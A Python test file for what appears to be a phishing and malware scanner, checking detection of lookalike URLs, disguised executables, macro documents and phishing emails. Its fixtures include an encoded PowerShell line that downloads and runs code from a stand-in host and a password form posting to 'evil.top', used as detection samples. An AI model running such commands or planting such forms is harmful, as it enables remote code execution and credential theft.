import io
import zipfile

from snareglass.files import analyze_file
from snareglass.scan import scan_eml, scan_message, scan_url
from snareglass.urls import analyze_url


def codes(findings):
    return {f.code for f in findings}


def test_lookalike_and_mismatch():
    r = analyze_url("http://paypa1-secure-login.top/verify", "www.paypal.com/account")
    c = codes(r.findings)
    assert {"URL_BRAND_LOOKALIKE", "URL_TEXT_MISMATCH", "URL_NO_TLS"} <= c


def test_official_domain_is_clean():
    assert not analyze_url("https://www.paypal.com/signin").findings


def test_userinfo_and_ip():
    c = codes(analyze_url("http://paypal.com@203.0.113.9/x").findings)
    assert "URL_USERINFO" in c and "URL_IP_HOST" in c


def test_dangerous_scheme():
    assert scan_url("javascript:alert(1)").verdict in {"SUSPICIOUS", "DANGEROUS"}


def test_exe_disguised_as_pdf():
    f = analyze_file("invoice.pdf", b"MZ" + b"\x00" * 100)
    assert {"TYPE_MISMATCH", "FILE_EXECUTABLE"} <= codes(f.findings)


def test_double_extension():
    assert "EXT_DOUBLE" in codes(analyze_file("report.pdf.exe", b"MZ\x00").findings)


def test_docx_macro_detection():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("word/document.xml", "<w:t>Please enable content</w:t>")
        z.writestr("word/vbaProject.bin", b"x")
    f = analyze_file("offer.docm", buf.getvalue())
    assert "OFFICE_MACROS" in codes(f.findings) and f.detected_type == "docx"
    assert "enable content" in f.preview.lower()


def test_encoded_powershell_script():
    f = analyze_file("a.txt", b"powershell -nop -enc SQBFAFgA\nIEX (New-Object Net.WebClient).DownloadString('http://x.top/a')")
    assert {"SCRIPT_PS_ENCODED", "SCRIPT_IEX", "SCRIPT_DOWNLOADER"} <= codes(f.findings)


def test_html_credential_page():
    f = analyze_file("secure.html", b"<html><form action='https://evil.top/p'><input type='password'></form></html>")
    assert "HTML_PASSWORD_FORM" in codes(f.findings)


def test_sample_eml():
    r = scan_eml(open("examples/sample_phish.eml", "rb").read())
    assert r.verdict == "DANGEROUS"
    assert "credential phishing" in r.categories


def test_benign_message():
    r = scan_message("a@friend.org", "Lunch?", "Want to grab lunch tomorrow? Map: https://maps.example.org/x")
    assert r.verdict == "LIKELY SAFE"
